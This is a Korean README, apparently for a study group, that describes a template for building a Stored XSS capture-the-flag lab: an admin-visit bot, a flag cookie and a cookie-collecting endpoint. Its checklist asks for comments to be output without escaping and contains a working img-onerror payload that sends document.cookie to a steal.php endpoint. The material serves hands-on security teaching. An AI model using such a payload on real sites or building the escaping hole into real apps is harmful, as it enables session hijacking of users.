# 2조에게 전달하는 XSS 봇 최소 템플릿

2조는 게시판·댓글 기능과 Stored XSS 취약점만 직접 구현하시면 됩니다. 아래 4가지는 이미 준비되어 있으니 그대로 가져다 쓰세요.

## 포함된 것

1. **`bot/` 폴더** — "관리자 확인" 요청을 받으면 게시글 페이지를 1회 방문하는 봇 (Node.js + Puppeteer)
2. **`bot/bot.js` 안의 플래그 쿠키 예시** — `WUISP{...}` 형식으로 관리자 세션 쿠키에 플래그를 담는 방식
3. **`steal-endpoint-example.php`** — 탈취된 쿠키를 앱 자체 파일(`data/stolen.txt`)에 저장하는 엔드포인트 예시 (별도 로그 서버 불필요)
4. **`docker-compose.snippet.yml`** — 위 2개를 자기 compose 파일에 어떻게 연결하는지 보여주는 예시

## 사용 방법

1. `bot/` 폴더를 통째로 복사해서 `challenges/xss/bot/`에 넣으세요.
2. `steal-endpoint-example.php`를 참고해서 본인 게시판 앱 안에 `steal.php` 같은 엔드포인트를 만드세요.
3. `docker-compose.snippet.yml` 내용을 참고해서 본인 게시판 앱(`xss-app`) 서비스와 함께 `challenges/xss/docker-compose.yml`을 완성하세요.
4. 게시글 페이지에 "🔑 관리자 확인" 버튼을 만들고, 클릭 시 서버가 `http://xss-bot:3000/check?post_id=...` 로 요청을 보내도록 구현하세요. (버튼 클릭 → 서버가 봇 호출, 이 흐름만 구현하면 됩니다)

봇은 `TARGET_BASE` URL을 기준으로 관리자 쿠키를 설정합니다. `xss-app`과 `xss-bot`은 같은 Compose 기본 네트워크에 있어야 합니다.

## 정상 시나리오 검증 체크리스트

- [ ] `docker compose up`으로 `xss-app`, `xss-bot`이 함께 뜬다
- [ ] 댓글에 이스케이프 없이 입력값이 그대로 출력된다 (Stored XSS 재현)
- [ ] 댓글에 아래 payload를 등록할 수 있다
  ```html
  <img src=x onerror="new Image().src='http://xss-app/steal.php?cookie='+document.cookie">
  ```
- [ ] "🔑 관리자 확인" 버튼을 클릭하면 `xss-bot`이 그 순간에만 1회 실행된다 (상시로 돌지 않음)
- [ ] 봇이 게시글을 방문하는 순간 payload가 실행되어 `steal.php`로 쿠키가 전송된다
- [ ] `data/stolen.txt`에 `WUISP{...}` 형식의 플래그가 기록된다
- [ ] `docker compose down` 후 다시 `up` 해도 동일하게 재현된다

막히는 부분은 스터디장에게 바로 문의하세요.
